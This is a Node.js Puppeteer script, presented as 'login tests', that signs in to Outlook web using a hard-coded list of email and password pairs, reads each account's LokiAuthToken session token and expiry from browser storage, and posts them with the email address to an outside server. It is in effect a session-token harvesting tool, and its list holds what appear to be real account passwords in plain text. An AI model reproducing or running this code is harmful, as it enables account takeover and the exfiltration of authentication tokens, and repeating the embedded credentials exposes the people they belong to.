const puppeteer = require('puppeteer');
const fetch = require('node-fetch');

async function logintest(email, password) {
  const browser = await puppeteer.launch({
    headless: false,
    defaultViewport: null,
  });
  //const chromeVersion = await browser.version();
  
  const page = await browser.newPage();

 

  await page.setUserAgent(`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.57 Safari/537.36`);
  
  const url = 'https://outlook.office.com/mail/';

  await page.goto(url);

  // Wait for the login page to load
  await page.waitForSelector('input[name="loginfmt"]');

  // Fill in the login form
  await page.type('input[name="loginfmt"]', email);

  await Promise.all([
    page.click('input[type="submit"]'),
    page.waitForNavigation(),
  ]);

  // Wait for the password input field to appear
  await page.waitForSelector('input[name="passwd"]');

  // Fill in the password
  await page.type('input[name="passwd"]', password);

  //Submit password
  await page.waitForSelector('#idSIButton9');
  await page.click('#idSIButton9'),
  await delay(4000);
  await page.waitForSelector('#acceptButton');
  await page.click('#acceptButton');

  await page.waitForSelector('#innerRibbonContainer > div.groupContainer-186 > div > div > div > div:nth-child(1) > div > span > button.splitPrimaryButton');
  await page.click('#innerRibbonContainer > div.groupContainer-186 > div > div > div > div:nth-child(1) > div > span > button.splitPrimaryButton');

  // await page.waitForSelector('#innerRibbonContainer > div.groupContainer-185 > div > div > div > div:nth-child(1) > div > div > span > button.splitPrimaryButton.root-190');
  // await page.click('#innerRibbonContainer > div.groupContainer-185 > div > div > div > div:nth-child(1) > div > div > span > button.splitPrimaryButton.root-190');

  
  // await apge.waitForSelect('#innerRibbonContainer > div:nth-child(1) > div > div > div > div:nth-child(1) > div > div > span > button.splitPrimaryButton.root-193');
  // await page.click('#innerRibbonContainer > div:nth-child(1) > div > div > div > div:nth-child(1) > div > div > span > button.splitPrimaryButton.root-193')
  delay(3000)
  // await page.waitForSelector('#docking_InitVisiblePart_0 > div > div.QFieH.J8sYv > div:nth-child(1) > div > div.AtODR.YQREw.qeaxG > div > div > div.T6Va1.VbY1P.EditorClass.aoWYQ');
  // await page.type('#docking_InitVisiblePart_0 > div > div.QFieH.J8sYv > div:nth-child(1) > div > div.AtODR.YQREw.qeaxG > div > div > div.T6Va1.VbY1P.EditorClass.aoWYQ', 'will@microsoft.COM'),
   
  await page.waitForSelector('#docking_InitVisiblePart_0 > div > div.QFieH.J8sYv > div:nth-child(1) > div > div.AtODR.YQREw.qeaxG > div > div > div.___eti9s20.fwg0e2s.f14t3ns0.f1e2ae29.fsslvku.f1x6zl8s.f133ih0r.f1jdsjjj.fly5x3f.fgr6219.f1ujusj6.f10jk5vf.fcgxt0o.f113hnb5.EditorClass.aoWYQ')
  await page.type('#docking_InitVisiblePart_0 > div > div.QFieH.J8sYv > div:nth-child(1) > div > div.AtODR.YQREw.qeaxG > div > div > div.___eti9s20.fwg0e2s.f14t3ns0.f1e2ae29.fsslvku.f1x6zl8s.f133ih0r.f1jdsjjj.fly5x3f.fgr6219.f1ujusj6.f10jk5vf.fcgxt0o.f113hnb5.EditorClass.aoWYQ', 'will@microsoft.COM')


  await delay(4000);
  await page.keyboard.press('\n');
  await delay(4000);

  const key = 'LokiAuthToken'; // Replace with the actual key
  const sessionStorageValue = await page.evaluate((key) => {
    return sessionStorage.getItem(key);
  }, key);

  console.log(`Value of ${key} in session storage:`, sessionStorageValue);

  const expDate = await page.evaluate(() => {
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      if (key.startsWith('EXPLokiAuthToken')) {
        return sessionStorage.getItem(key);
      }
    }
    return ''; // Return null if the key is not found
  });

  console.log(`Value of EXPLokiAuthToken in session storage:`, expDate);



  // Make a POST request to the specified URL with the sessionStorageValue
  const postUrl = 'https://gateway.datagma.net/api/ingress/v1/store_token';
  
  try {
    const response = await fetch(postUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        token: sessionStorageValue,
        email: email,
        type: 'outlook',
        expLokiAuthToken: expDate
      }),
    });

    if (response.ok) {
      const responseData = await response.json();
      console.log('POST request successful:', responseData, email);
    } else {
      console.error('Error making POST request. Status:', response.status);
    }
  } catch (error) {
    console.error('Error making POST request:', error.message);
  }

  await browser.close();
}

function delay(time) {
  return new Promise(function(resolve) { 
      setTimeout(resolve, time)
  });
}

// List of email and password combinations
const emailPasswordList = [
  // { email: 'john_smith1788@outlook.com', password: 'Elfiltower' },
  // { email: 'benducket2024@outlook.com', password: 'Burjkhalifa' },
  // { email: 'Raphel_azot@outlook.com', password: 'Baketime1@' },
  // { email: 'abcd18971@outlook.com', password: 'Statueofliberty' },
  // { email: 'benstokes1891@outlook.com', password: 'Cookingtime' },
  // //{ email: 'NolanCallahaan@outlook.com', password: 'Bwnn_CLHnLn182900' },
  // { email: 'NathanZhg@outlook.com', password: 'Na!h1727ja=01' },
  // { email: 'natasyakuznetsova@outlook.com', password: 'VCO0116hwkk' },
  // { email: 'ahmddzeid@outlook.com', password: 'bs)#001Ggwy1579' },
  // { email: 'ekaptrii@outlook.com', password: 'jgsh)/176590-/' },
  { email: 'raphael_azot@hotmail.fr', password: 'MonkISbEST39#' },
  { email: 'david.monk@outlook.fr', password: 'MonkISbEST39##' },
  { email: 'laetitia.davidof@hotmail.com', password: 'MonkISbEST39##' },
  { email: 'michel.blanchon@hotmail.com', password: 'MonkISbEST39##' }

];

async function runLoginTests(emailPasswordList) {
  const browser = await puppeteer.launch({
    headless: true,
    defaultViewport: null,
  });

  try {
    for (const { email, password } of emailPasswordList) {
      try {
        await logintest(email, password);
      } catch (error) {
        console.error(`Error for email ${email}: ${error.message}`);
      }
    }
  } finally {
    // Close the browser after all tests are done
    await browser.close();
  }
}

runLoginTests(emailPasswordList)
  .then(() => {
    console.log('All login tests completed');
    process.exit(0); // Exit with code 0 (success)
  })
  .catch(error => {
    console.error('Error running login tests:', error);
    process.exit(1); // Exit with code 1 (failure)
  });
